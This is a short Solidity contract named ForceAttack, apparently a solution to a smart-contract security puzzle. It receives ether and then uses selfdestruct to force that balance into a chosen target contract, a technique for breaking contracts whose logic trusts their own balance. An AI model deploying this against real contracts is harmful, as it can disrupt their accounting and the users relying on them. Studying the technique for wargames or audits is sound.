// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function close(address payable contr) public {
        selfdestruct(contr);
    }

    receive() external payable {}
}
